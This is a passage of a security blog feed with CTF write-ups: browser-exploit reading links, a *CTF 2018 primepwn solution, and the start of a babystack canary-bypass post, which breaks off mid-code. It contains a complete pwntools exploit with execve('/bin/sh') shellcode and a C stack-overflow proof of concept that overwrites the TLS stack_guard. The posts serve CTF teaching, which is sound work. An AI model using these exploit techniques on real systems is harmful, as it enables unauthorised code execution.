rel="noopener">http://cygx.mydns.jp/blog/?arti=527</a></li><li><a href="http://researchcenter.paloaltonetworks.com/2014/12/google-chrome-exploitation-case-study/" target="_blank" rel="noopener">http://researchcenter.paloaltonetworks.com/2014/12/google-chrome-exploitation-case-study/</a></li><li><a href="https://github.com/secmob/BadKernel" target="_blank" rel="noopener">https://github.com/secmob/BadKernel</a></li><li><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=386988" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=386988</a></li><li><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=416449" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=416449</a></li><li><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=468933" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=468933</a> (pwn2own 2015)</li><li><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=595834" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=595834</a> (pwn2own 2016)</li><li><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=659474" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=659474</a></li><li><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=776677" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=776677</a></li><li><a href="https://halbecaf.com/2017/05/24/exploiting-a-v8-oob-write/" target="_blank" rel="noopener">https://halbecaf.com/2017/05/24/exploiting-a-v8-oob-write/</a></li><li><a href="https://www.it-sec-catalog.info/browser_exploitation.html" target="_blank" rel="noopener">https://www.it-sec-catalog.info/browser_exploitation.html</a></li><li><a href="https://arthurgerkis.gitbooks.io/it-sec-catalog/content/browser_exploitation.html" target="_blank" rel="noopener">https://arthurgerkis.gitbooks.io/it-sec-catalog/content/browser_exploitation.html</a></li><li><a href="https://github.com/tunz/js-vuln-db" target="_blank" rel="noopener">https://github.com/tunz/js-vuln-db</a></li></ul><h2 id="SpiderMonkey-exploit-study"><a href="#SpiderMonkey-exploit-study" class="headerlink" title="SpiderMonkey exploit study"></a>SpiderMonkey exploit study</h2><ul><li><a href="http://www.geeknik.net/6zawqzuuu" target="_blank" rel="noopener">http://www.geeknik.net/6zawqzuuu</a></li><li><a href="https://phoenhex.re/2017-06-21/firefox-structuredclone-refleak" target="_blank" rel="noopener">https://phoenhex.re/2017-06-21/firefox-structuredclone-refleak</a></li><li><a href="https://grehack.fr/data/2017/slides/GreHack17_Get_the_Spidermonkey_off_your_back.pdf" target="_blank" rel="noopener">https://grehack.fr/data/2017/slides/GreHack17_Get_the_Spidermonkey_off_your_back.pdf</a></li><li><a href="https://github.com/rh0dev/slides/blob/master/OffensiveCon2018_From_Assembly_to_JavaScript_and_back.pdf" target="_blank" rel="noopener">https://github.com/rh0dev/slides/blob/master/OffensiveCon2018_From_Assembly_to_JavaScript_and_back.pdf</a></li></ul><h2 id="WebKit-JSC-exploit-study"><a href="#WebKit-JSC-exploit-study" class="headerlink" title="WebKit-JSC exploit study"></a>WebKit-JSC exploit study</h2><ul><li><a href="https://cansecwest.com/slides/2015/Liang_CanSecWest2015.pdf" target="_blank" rel="noopener">https://cansecwest.com/slides/2015/Liang_CanSecWest2015.pdf</a></li><li><a href="http://www.powerofcommunity.net/poc2016/keen.pdf" target="_blank" rel="noopener">http://www.powerofcommunity.net/poc2016/keen.pdf</a></li><li><a href="http://www.phrack.org/papers/attacking_javascript_engines.html" target="_blank" rel="noopener">http://www.phrack.org/papers/attacking_javascript_engines.html</a></li><li><a href="https://scarybeastsecurity.blogspot.jp/2017/05/ode-to-use-after-free-one-vulnerable.html" target="_blank" rel="noopener">https://scarybeastsecurity.blogspot.jp/2017/05/ode-to-use-after-free-one-vulnerable.html</a></li><li><a href="https://phoenhex.re/2017-06-09/pwn2own-diskarbitrationd-privesc" target="_blank" rel="noopener">https://phoenhex.re/2017-06-09/pwn2own-diskarbitrationd-privesc</a></li><li><a href="https://phoenhex.re/2017-07-06/pwn2own-sandbox-escape" target="_blank" rel="noopener">https://phoenhex.re/2017-07-06/pwn2own-sandbox-escape</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;v8的知识结构&quot;&gt;&lt;a href=&quot;#v8的知识结构&quot; class=&quot;headerlink&quot; title=&quot;v8的知识结构&quot;&gt;&lt;/a&gt;v8的知识结构&lt;/h1&gt;&lt;h2 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
      <category term="v8" scheme="http://eternalsakura13.com/tags/v8/"/>
    
  </entry>
  
  <entry>
    <title>CTF中利用syscall写shellcode及*ctf primepwn writeup</title>
    <link href="http://eternalsakura13.com/2018/04/27/star_primepwn/"/>
    <id>http://eternalsakura13.com/2018/04/27/star_primepwn/</id>
    <published>2018-04-27T05:03:26.181Z</published>
    <updated>2018-04-27T17:49:38.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>如何写shellcode是二进制选手的基本素养了，本题中通过syscall的一些trick用法来写shellcode，getshell。</p><h2 id="赛题链接"><a href="#赛题链接" class="headerlink" title="赛题链接"></a>赛题链接</h2><p><a href="https://github.com/eternalsakura/ctf_pwn/tree/master/sixstar/sixstar/primepwn" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/tree/master/sixstar/sixstar/primepwn</a><br><a href="https://github.com/sixstars/starctf2018/tree/master/pwn-primepwn" target="_blank" rel="noopener">https://github.com/sixstars/starctf2018/tree/master/pwn-primepwn</a></p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="Linux系统调用"><a href="#Linux系统调用" class="headerlink" title="Linux系统调用"></a>Linux系统调用</h3><p>举个例子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line"></span><br><span class="line">msg:</span><br><span class="line">    .ascii &quot;Hello, world!\n&quot;</span><br><span class="line">    len = . - msg</span><br><span class="line"></span><br><span class="line">.text</span><br><span class="line">    .global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    movq  $1, %rax</span><br><span class="line">    movq  $1, %rdi</span><br><span class="line">    movq  $msg, %rsi</span><br><span class="line">    movq  $len, %rdx</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    movq  $60, %rax</span><br><span class="line">    xorq  %rdi, %rdi</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure></p><p>输出结果是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./test</span><br><span class="line">Hello, world!</span><br></pre></td></tr></table></figure></p><p>实际上这里是直接使用了write的syscall，它的系统调用号是1.<br>其他的syscall的系统调用号可以在<a href="https://github.com/torvalds/linux/blob/16f73eb02d7e1765ccab3d2018e0bd98eb93d973/arch/x86/entry/syscalls/syscall_64.tbl" target="_blank" rel="noopener">系统调用表</a>查看。<br>我们可以看到我们在示例程序里用到的，1是write，60是exit退出程序。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1commonwritesys_write</span><br><span class="line">60commonexitsys_exit</span><br></pre></td></tr></table></figure></p><p>对于64位程序，通过syscall进入系统调用，将系统调用号传入rax，各个参数按照rdi、rsi、rdx的顺序传递到寄存器中，系统调用返回值储存到rax寄存器。</p><h3 id="syscall的trick"><a href="#syscall的trick" class="headerlink" title="syscall的trick"></a>syscall的trick</h3><p>syscall在所有寄存器都为0的情况下，执行的时候会把rip赋值给rcx。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-050803.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-050747.png" alt=""><br>首先输入一个unsigned long也就是8字节的数据，然后判定输入的数据(写到0x601038)是不是素数，如果不是素数，程序就结束掉，如果是素数，那么继续运行。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-051405.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-051440.png" alt=""><br>可以看到0x601030存放的是指向0x601038的指针。<br>之后程序会把寄存器都清零，然后跳到0x601030指向的空间执行，也就是跳到0x601038，执行我们写入的数据。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>为了方便读者自己调试分析，我就走一遍exp，然后描述一下利用过程。<br>exp如下，我加了一行gdb.attach用来调试。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> bruteforce</span><br><span class="line"><span class="keyword">from</span> parse <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">pwn_file=<span class="string">"./primepwn"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv)==<span class="number">1</span>:</span><br><span class="line">    conn=process(pwn_file)</span><br><span class="line">    pid=conn.pid</span><br><span class="line">    gdb.attach(conn) <span class="comment"># 用作调试</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    conn=remote(<span class="string">"47.89.18.224"</span>,<span class="number">10008</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">brute_force</span><span class="params">(prefix,s)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> bruteforce(<span class="keyword">lambda</span> x:sha256(x+prefix).hexdigest()==s,string.ascii_letters+string.digits,length=<span class="number">4</span>)</span><br><span class="line">    data=conn.recvline(keepends=<span class="keyword">False</span>)</span><br><span class="line">    prefix,s=parse(<span class="string">"sha256(xxxx+&#123;&#125;) == &#123;&#125;"</span>,data)</span><br><span class="line">    conn.sendline(brute_force(prefix,s))</span><br><span class="line">    pid=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    log.debug(<span class="string">"process pid:%d"</span>%pid)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>,len(s),<span class="number">4</span>):</span><br><span class="line">        last=u32(s[i<span class="number">-4</span>:i])</span><br><span class="line">        now=u32(s[i:i+<span class="number">4</span>])</span><br><span class="line">        <span class="keyword">if</span> last &gt; now:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line">code=<span class="string">"""</span></span><br><span class="line"><span class="string">start:</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    dec edx</span></span><br><span class="line"><span class="string">    mov esi,ecx</span></span><br><span class="line"><span class="string">    jmp start</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">payload=asm(code,arch=<span class="string">"amd64"</span>)</span><br><span class="line">conn.sendline(str(u64(payload)))</span><br><span class="line">log.debug(<span class="string">"sleep 20s"</span>)</span><br><span class="line">sleep(<span class="number">20</span>)</span><br><span class="line">code=<span class="string">"""</span></span><br><span class="line"><span class="string">    mov rsp,rcx</span></span><br><span class="line"><span class="string">    add rsp,0x100</span></span><br><span class="line"><span class="string">    mov rax,0x3b</span></span><br><span class="line"><span class="string">    xor rsi,rsi</span></span><br><span class="line"><span class="string">    xor rdx,rdx</span></span><br><span class="line"><span class="string">    call get_shell</span></span><br><span class="line"><span class="string">    .ascii "/bin/sh"</span></span><br><span class="line"><span class="string">    .byte 0</span></span><br><span class="line"><span class="string">get_shell:</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">conn.send(asm(code,arch=<span class="string">"amd64"</span>))</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure></p><p>然后我们开始调试，如果你使用pwndbg插件，看到的应该和我一样。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-173228.png" alt=""><br>这样我们就断在了main函数执行之前，我们的目的是进入main函数单步看exp执行.<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-173323.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-173521.png" alt=""><br>所以我们按5次finish（finsh的作用是执行到当前函数结束返回）<br>现在你应该看到下面这样：<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-173438.png" alt=""><br>然后单步n，一直单步到main函数最后的jmp。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-173715.png" alt=""></p><p>由程序分析可知，首先我们要准备一个是素数的shellcode,且不能超过8个字节。<br>利用我们之前提到的syscall trick就可以做到，后面会分析为什么。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-071108.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">start:</span><br><span class="line">    syscall</span><br><span class="line">    dec edx</span><br><span class="line">    mov esi,ecx</span><br><span class="line">    jmp start</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400A57 loc_400A57:                             ; CODE XREF: main+56↑j</span><br><span class="line">.text:0000000000400A57                 xor     rax, rax</span><br><span class="line">.text:0000000000400A5A                 xor     rbx, rbx</span><br><span class="line">.text:0000000000400A5D                 xor     rcx, rcx</span><br><span class="line">.text:0000000000400A60                 xor     rdx, rdx</span><br><span class="line">.text:0000000000400A63                 xor     rsi, rsi</span><br><span class="line">.text:0000000000400A66                 xor     rdi, rdi</span><br><span class="line">.text:0000000000400A69                 xor     rsp, rsp</span><br><span class="line">.text:0000000000400A6C                 xor     rbp, rbp</span><br><span class="line">.text:0000000000400A6F                 xor     r8, r8</span><br><span class="line">.text:0000000000400A72                 xor     r9, r9</span><br><span class="line">.text:0000000000400A75                 xor     r10, r10</span><br><span class="line">.text:0000000000400A78                 xor     r11, r11</span><br><span class="line">.text:0000000000400A7B                 xor     r12, r12</span><br><span class="line">.text:0000000000400A7E                 xor     r13, r13</span><br><span class="line">.text:0000000000400A81                 xor     r14, r14</span><br><span class="line">.text:0000000000400A84                 xor     r15, r15</span><br><span class="line">.text:0000000000400A87                 jmp     cs:qword_601030</span><br></pre></td></tr></table></figure><p>由于在这里我们通过xor把寄存器都清空了，所以在执行syscall的时候，把rip的值赋给了rcx。<br>syscall执行前<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-173831.png" alt=""><br>syscall执行后<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-173907.png" alt=""><br>然后传递参数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dec edx</span><br><span class="line">mov esi,ecx</span><br></pre></td></tr></table></figure></p><p>edx从0减去1就是-1，即0xFFFFFFFF。<br>esi=ecx=rip。<br>rdi和eax在之前就已经被清零了。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-173943.png" alt=""><br>jmp跳到syscall执行，相当于调用sys_read(0,rip,0xFFFFFFFF)<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-174015.png" alt=""><br>sys_read执行结束后，0x60103a(即rip，也就是下一条要执行的命令)及其之后的指令被覆盖,如下图可以看到我们将继续执行真正的shellcode。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-174142.png" alt=""></p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-071417.jpg" alt=""><br>将真正的shellcode读入到rip中，这样，继续执行就执行到了我们的shellcode。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">code=&quot;&quot;&quot;</span><br><span class="line">    mov rsp,rcx</span><br><span class="line">    add rsp,0x100---&gt;这句可以删掉</span><br><span class="line">    mov rax,0x3b</span><br><span class="line">    xor rsi,rsi</span><br><span class="line">    xor rdx,rdx</span><br><span class="line">    call get_shell</span><br><span class="line">    .ascii &quot;/bin/sh&quot;</span><br><span class="line">    .byte 0</span><br><span class="line">get_shell:</span><br><span class="line">    pop rdi</span><br><span class="line">    syscall</span><br><span class="line">&quot;&quot;&quot;</span><br></pre></td></tr></table></figure></p><p>因为之前rsp被置0了，所以为了在栈上保存/bin/sh，用在后面pop rdi。<br>现在要让rsp指向一个可写的地址，于是把rcx赋值给它。<br>然后将execve的系统调用号赋值给rax。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x3bexecvesys_execve/ptregs</span><br></pre></td></tr></table></figure></p><p>传递参数，执行execve(‘/bin/sh’,0,0)来getshell<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-174412.png" alt=""><br>注意在call的时候，会先把返回地址压栈，而返回地址就是下一条指令，也就是0x601056。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-174616.png" alt=""><br>gdb里si跟入call的函数。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-174717.png" alt=""><br>然后pop rdi就把参数传进去了，接着syscall就执行了execve(‘/bin/sh’,0,0)<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-174823.png" alt=""><br>getshell<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-174852.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;如何写shellcode是二进制选手的基本素养了，本题中通过syscall的一些trick用法来写shellcode，getshell。&lt;/
      
    
    </summary>
    
      <category term="CTF" scheme="http://eternalsakura13.com/categories/CTF/"/>
    
      <category term="pwn" scheme="http://eternalsakura13.com/categories/CTF/pwn/"/>
    
      <category term="其他" scheme="http://eternalsakura13.com/categories/CTF/pwn/%E5%85%B6%E4%BB%96/"/>
    
    
  </entry>
  
  <entry>
    <title>thread stack bypass canary和sixstar ctf babystack writeup</title>
    <link href="http://eternalsakura13.com/2018/04/24/starctf_babystack/"/>
    <id>http://eternalsakura13.com/2018/04/24/starctf_babystack/</id>
    <published>2018-04-24T15:51:19.659Z</published>
    <updated>2018-04-27T05:04:04.344Z</updated>
    
    <content type="html"><![CDATA[<h2 id="赛题链接"><a href="#赛题链接" class="headerlink" title="赛题链接"></a>赛题链接</h2><p><a href="https://github.com/sixstars/starctf2018/tree/master/pwn-babystack" target="_blank" rel="noopener">https://github.com/sixstars/starctf2018/tree/master/pwn-babystack</a><br><a href="https://github.com/eternalsakura/ctf_pwn/tree/master/sixstar/sixstar/babystack" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/tree/master/sixstar/sixstar/babystack</a><br>sixstar是真的良心，连赛题源码都放出了，十分适合学习。</p><h2 id="前置技能"><a href="#前置技能" class="headerlink" title="前置技能"></a>前置技能</h2><h3 id="TLS和thread-stack"><a href="#TLS和thread-stack" class="headerlink" title="TLS和thread stack"></a>TLS和thread stack</h3><p>用到的技术来源于<a href="http://www.openwall.com/lists/oss-security/2018/02/27/5" target="_blank" rel="noopener">New bypass and protection techniques for ASLR on Linux</a><br>这篇文章，我把其中重点的部分按照我的理解翻译了一下，如果有问题请指正~</p><p>线程局部存储（Thread Local Storage）是一种机制，通过该机制分配变量，以便每一个现存的线程都有一个变量实例。<br>它主要是为了避免多个线程同时访存同一全局变量或者静态变量时所导致的冲突，尤其是多个线程同时需要修改这一变量时。为了解决这个问题，我们可以通过TLS机制，为每一个使用该全局变量的线程都提供一个变量值的副本，每一个线程均可以独立地改变自己的副本，而不会和其它线程的副本冲突。从线程的角度看，就好像每一个线程都完全拥有该变量。而从全局变量的角度上来看，就好像一个全局变量被克隆成了多份副本，而每一份副本都可以被一个线程独立地改变。</p><p>这个机制在不同的架构和操作系统上的实现不同，本例实现在x86-64，glibc。<br>在本例中,mmap也被用来创建线程，这意味着如果TLS接近vulnerable object，它可能会被修改。<br>有趣的是，在glibc实现中，TLS被指向一个segment register fs(x86-64上)，它的结构tcbhead_t定义如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">void</span> *tcb;        <span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">               thread descriptor used by libpthread.  */</span></span><br><span class="line">  <span class="keyword">dtv_t</span> *dtv;</span><br><span class="line">  <span class="keyword">void</span> *self;       <span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">  <span class="keyword">int</span> multiple_threads;</span><br><span class="line">  <span class="keyword">int</span> gscope_flag;</span><br><span class="line">  <span class="keyword">uintptr_t</span> sysinfo;</span><br><span class="line">  <span class="keyword">uintptr_t</span> stack_guard;</span><br><span class="line">  <span class="keyword">uintptr_t</span> pointer_guard;</span><br><span class="line">  ...</span><br><span class="line">&#125; <span class="keyword">tcbhead_t</span>;</span><br></pre></td></tr></table></figure></p><p>它包括了stack_guard，即被称作canary的随机数，用来防止栈溢出。<br>它的工作模式是：当一个函数被调用，canary从tcbhead_t.stack_guard被放到栈上。在函数调用结束的时候，栈上的值被和tcbhead_t.stack_guard比较，如果两个值是不相等的，程序将会返回error并且终止。<br>研究表明，glibc在TLS实现上存在问题，线程在pthread_create的帮助下创建，然后需要给这个新线程选择TLS。<br>在为栈分配内存后，glibc在内存的高地址初始化TLS，在x86-64架构上，栈向下增长，将TLS放在栈顶部。<br>从TLS中减去一个特定的常量值，我们得到被新线程的stack register所使用的值。<br>从TLS到pthread_create的函数参数传递栈帧的距离小于一页。<br>现在攻击者将不需要得到leak canary的值，而是直接栈溢出足够多的数据来复写TLS中的tcbhead_t.stack_guard的值，从而bypass canary。<br>下面是一个例子。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pwn_payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *argv[<span class="number">2</span>] = &#123;<span class="string">"/bin/sh"</span>, <span class="number">0</span>&#125;;</span><br><span class="line">    execve(argv[<span class="number">0</span>], argv, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fixup = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> * <span class="title">first</span><span class="params">(<span class="keyword">void</span> *x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *addr;</span><br><span class="line">    arch_prctl(ARCH_GET_FS, &amp;addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"thread FS %p\n"</span>, addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"cookie thread: 0x%lx\n"</span>, addr[<span class="number">5</span>]);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> * frame = __builtin_frame_address(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"stack_cookie addr %p \n"</span>, &amp;frame[<span class="number">-1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"diff : %lx\n"</span>, (<span class="keyword">char</span>*)addr - (<span class="keyword">char</span>*)&amp;frame[<span class="number">-1</span>]); </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> len =(<span class="keyword">unsigned</span> <span class="keyword">long</span>)( (<span class="keyword">char</span>*)addr - (<span class="keyword">char</span>*)&amp;frame[<span class="number">-1</span>]) + </span><br><span class="line">fixup;</span><br><span class="line">    <span class="comment">// example of exploitation</span></span><br><span class="line">    <span class="comment">// prepare exploit</span></span><br><span class="line">    <span class="keyword">void</span> *exploit = <span class="built_in">malloc</span>(len);</span><br><span class="line">    <span class="built_in">memset</span>(exploit, <span class="number">0x41</span>, len);</span><br><span class="line">    <span class="keyword">void</span> *ptr = &amp;pwn_payload;</span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="keyword">char</span>*)exploit + <span class="number">16</span>, &amp;ptr, <span class="number">8</span>);</span><br><span class="line">    <span class="comment">// exact stack-buffer overflow example</span></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;frame[<span class="number">-1</span>], exploit, len);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> one;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *addr;</span><br><span class="line">    <span class="keyword">void</span> *val;</span><br><span class="line">    arch_prctl(ARCH_GET_FS, &amp;addr);</span><br><span class="line">    <span class="keyword">if</span> (argc &gt; <span class="number">1</span>)</span><br><span class="line">        fixup = <span class="number">0x30</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"main FS %p\n"</span>, 